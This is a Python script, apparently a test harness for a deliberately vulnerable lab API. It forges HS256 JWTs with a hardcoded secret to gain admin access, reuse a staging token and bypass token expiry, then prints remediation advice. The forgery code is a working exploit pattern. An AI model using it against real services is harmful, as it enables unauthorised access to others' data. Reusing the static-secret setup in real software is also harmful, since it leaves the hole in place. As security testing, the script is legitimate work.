import jwt
import requests
import json
from datetime import datetime, timedelta

# Configuration
API_BASE = "http://10.0.0.105:3001"  # Docker host IP and correct port
JWT_SECRET = "your-jwt-secret-key-2024"  # The static key from our vulnerable implementation

class JWTVulnerabilityTest:
    def __init__(self):
        self.session = requests.Session()
        self.admin_token = None
        self.user_token = None

    def register_user(self, username, password):
        """Register a new user"""
        response = requests.post(
            f"{API_BASE}/api/auth/register",
            json={"username": username, "password": password}
        )
        print(f"Register {username}: {response.status_code}")
        print(f"Response: {response.text}")
        return response.json()

    def login_user(self, username, password):
        """Login and get JWT token"""
        response = requests.post(
            f"{API_BASE}/api/auth/login",
            json={"username": username, "password": password}
        )
        print(f"Login {username}: {response.status_code}")
        print(f"Response: {response.text}")
        return response.json()

    def create_forged_token(self, user_data, role="admin"):
        """Create a forged token with elevated privileges"""
        payload = {
            "id": user_data.get("id", "fake_id"),
            "username": user_data.get("username", "fake_user"),
            "role": role,
            "iat": datetime.utcnow(),
            "exp": datetime.utcnow() + timedelta(days=1)
        }
        return jwt.encode(payload, JWT_SECRET, algorithm="HS256")

    def test_normal_flow(self):
        """Test normal authentication flow"""
        print("\n=== Testing Normal Authentication Flow ===")
        
        # Register users
        self.register_user("normal_user", "password123")
        self.register_user("admin_user", "admin123")

        # Login and get tokens
        user_data = self.login_user("normal_user", "password123")
        admin_data = self.login_user("admin_user", "admin123")

        self.user_token = user_data["token"]
        self.admin_token = admin_data["token"]

        print("✅ Normal authentication flow completed")

    def test_token_forgery(self):
        """Test token forgery vulnerability"""
        print("\n=== Testing Token Forgery Vulnerability ===")

        # Create a forged admin token
        forged_token = self.create_forged_token(
            {"username": "forged_admin"},
            role="admin"
        )

        # Try to access protected endpoint with forged token
        headers = {"Authorization": f"Bearer {forged_token}"}
        response = requests.get(f"{API_BASE}/api/invoice/all", headers=headers)
        
        print(f"Access with forged token: {response.status_code}")
        print(f"Response: {response.text}")
        if response.status_code == 200:
            print("⚠️ VULNERABILITY: Successfully accessed protected endpoint with forged token!")
        return response.status_code == 200

    def test_cross_environment(self):
        """Test cross-environment token reuse"""
        print("\n=== Testing Cross-Environment Token Reuse ===")
        
        # In real scenario, this token would be from staging/dev environment
        # Here we simulate by creating a token with staging claims
        staging_token = jwt.encode({
            "id": "staging_user_id",
            "username": "staging_user",
            "role": "admin",
            "env": "staging",
            "iat": datetime.utcnow(),
            "exp": datetime.utcnow() + timedelta(days=1)
        }, JWT_SECRET, algorithm="HS256")

        # Try to use staging token in production
        headers = {"Authorization": f"Bearer {staging_token}"}
        response = requests.get(f"{API_BASE}/api/invoice/all", headers=headers)
        
        print(f"Access with staging token: {response.status_code}")
        print(f"Response: {response.text}")
        if response.status_code == 200:
            print("⚠️ VULNERABILITY: Successfully used staging token in production!")
        return response.status_code == 200

    def test_token_expiration_bypass(self):
        """Test token expiration bypass"""
        print("\n=== Testing Token Expiration Bypass ===")
        
        # Create an expired token but sign it with the known key
        expired_token = jwt.encode({
            "id": "expired_user_id",
            "username": "expired_user",
            "role": "admin",
            "iat": datetime.utcnow() - timedelta(days=2),
            "exp": datetime.utcnow() - timedelta(days=1)
        }, JWT_SECRET, algorithm="HS256")

        # Try to use expired token
        headers = {"Authorization": f"Bearer {expired_token}"}
        response = requests.get(f"{API_BASE}/api/invoice/all", headers=headers)
        
        print(f"Access with expired token: {response.status_code}")
        print(f"Response: {response.text}")
        if response.status_code == 200:
            print("⚠️ VULNERABILITY: Successfully bypassed token expiration!")
        return response.status_code == 200

def main():
    tester = JWTVulnerabilityTest()
    
    # Run tests
    try:
        tester.test_normal_flow()
        vulnerabilities_found = sum([
            tester.test_token_forgery(),
            tester.test_cross_environment(),
            tester.test_token_expiration_bypass()
        ])
        
        print(f"\n=== Test Summary ===")
        print(f"Vulnerabilities exploited: {vulnerabilities_found}/3")
        
        if vulnerabilities_found > 0:
            print("\n⚠️ SECURITY ALERT: JWT implementation is vulnerable!")
            print("Recommendations:")
            print("1. Use secure random keys for each environment")
            print("2. Implement key rotation")
            print("3. Use stronger algorithms")
            print("4. Add proper token validation and revocation")
        else:
            print("\n✅ JWT implementation appears to be secure")
            
    except Exception as e:
        print(f"Error during testing: {str(e)}")

if __name__ == "__main__":
    main() 